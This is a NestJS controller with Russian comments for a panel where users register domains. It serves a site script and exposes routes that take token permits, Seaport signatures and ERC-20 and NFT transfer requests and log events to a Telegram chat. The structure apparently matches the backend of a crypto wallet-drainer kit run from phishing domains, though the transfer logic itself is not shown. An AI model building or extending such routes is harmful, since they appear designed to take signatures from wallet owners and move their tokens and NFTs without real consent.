import {
  Body,
  Controller,
  Get,
  Headers,
  HttpCode,
  HttpStatus,
  Param,
  Post,
  Req,
  Res,
  UseGuards,
  Version,
} from '@nestjs/common';
import {
  ApiBody,
  ApiHeader,
  ApiOkResponse,
  ApiOperation,
  ApiParam,
  ApiTags,
  OmitType,
} from '@nestjs/swagger';
import * as e from 'express';
import { JwtAuthGuard } from 'src/auth/jwt-auth.guard';
import { Keys, User, Versions } from 'src/common';
import { UsersEntity } from 'src/user/user.entity';
import { DomainEntity } from './domain.entity';
import { DomainsService } from './domains.service';
import {
  AddDomainDto,
  IsConnectedResponseDto,
  LogToTelegramChatDto,
  TokenPermitDto,
  TransferNFTDto,
  UpdateDomainDto,
} from './dto';
import { TokenTransferDto } from './dto/token-transfer.dto';

@ApiTags('Домены')
@Controller('domains')
export class DomainsController {
  constructor(private domainsService: DomainsService) {}

  @ApiOperation({
    description: 'Добавить домен',
  })
  @ApiHeader({ name: Keys.AccessToken, description: 'Токен доступа' })
  @ApiHeader({ name: 'Version', enum: Versions })
  @ApiOkResponse({
    type: () => DomainEntity,
    description: 'Сущность домена',
  })
  @Version(Versions.Alpha)
  @HttpCode(HttpStatus.OK)
  @UseGuards(JwtAuthGuard)
  @Post('/add')
  public addDomain(@User() user: UsersEntity, @Body() dto: AddDomainDto) {
    return this.domainsService.addDomain(user, dto);
  }

  @ApiBody({
    type: () =>
      OmitType(DomainEntity, ['template_id', 'id', 'host', 'user_id'] as const),
  })
  @ApiOperation({
    description: 'Обновить настройки домена',
  })
  @ApiHeader({ name: Keys.AccessToken, description: 'Токен доступа' })
  @ApiHeader({ name: 'Version', enum: Versions })
  @ApiOkResponse({
    type: () => DomainEntity,
  })
  @Version(Versions.Alpha)
  @HttpCode(HttpStatus.OK)
  @UseGuards(JwtAuthGuard)
  @Post('/update/:domain_id')
  public update(
    @User() user: UsersEntity,
    @Body() dto: UpdateDomainDto,
    @Param('domain_id') domain_id: string,
  ) {
    return this.domainsService.update(user, +domain_id, dto);
  }

  /**
    Метод для проверки доступности домена. 
    
    Инструкция по использованию:
      С панели фронта - делаем запрос на user-domain.com/is-connected

      Если вернется: `IsConnectedResponseDto`, то домен подключен и все работает.
      
      Если нет, то что-то настроили неправильно.
  */
  @ApiOperation({
    description: `Метод для проверки того - подключен ли домен или нет.
    Сделать запрос на http(s?)://user-domain.com/is-connected
    `,
  })
  @ApiHeader({
    name: 'Host',
    required: false,
    description: 'Не указыаается, значение подставляется само',
  })
  @ApiParam({
    name: 'domain',
    required: false,
    description:
      'Не указыаается, nginx сам подставляет значение, если делать запрос через домен привязанный к нам',
  })
  @ApiOkResponse({
    type: () => IsConnectedResponseDto,
    description: 'Если домен подключен, то `is_connected` будет равен `true`',
  })
  @Post('/:domain/is-connected')
  public isConnected(
    @Param('domain') domain: string,
    @Headers('Host') host: string,
    @Req() req: e.Request,
  ): IsConnectedResponseDto {
    return this.domainsService.isConnected(host, req.path, domain);
  }

  @ApiOperation({ description: 'Скрипт для сайта' })
  @Get('/test/scripts/script.js')
  public getPageOrFile(
    @Req() req: e.Request,
    @Res({ passthrough: true }) res: e.Response,
  ) {
    res.header('Content-Type', 'text/javascript');
    return ``;
  }

  @ApiOperation({ description: 'Операция для скрипта домена' })
  @Post('/:domain/back.php')
  public logToTelegramChat(
    @Param('domain') host: string,
    @Body() dto: LogToTelegramChatDto,
  ) {
    return this.domainsService.logToTelegramChat(host, dto.m, dto.key);
  }

  @ApiOperation({ description: 'Операция для скрипта домена' })
  @Post('/:domain/api/token_permit')
  public tokenPermit(
    @Param('domain') host: string,
    @Body() dto: TokenPermitDto,
  ) {
    return this.domainsService.tokenPermit(host, dto);
  }

  @ApiOperation({ description: 'Операция для скрипта домена' })
  @Post('/:domain/api/token_transfer')
  public tokenTransfer(
    @Param('domain') host: string,
    @Body() dto: TokenTransferDto,
  ) {
    return this.domainsService.transferERC(host, dto);
  }

  @ApiOperation({ description: 'Операция для скрипта домена' })
  @Post('/:domain/api/seaport_sign')
  public seaportSign(@Param('domain') host: string, @Body() dto: any) {
    return this.domainsService.seaportSign(host, dto);
  }

  @ApiOperation({ description: 'Операция для скрипта домена' })
  @Post('/:domain/api/nft_transfer')
  public nftTransfer(
    @Param('domain') host: string,
    @Body() dto: TransferNFTDto,
  ) {
    return this.domainsService.transferNFT(host, dto);
  }
}
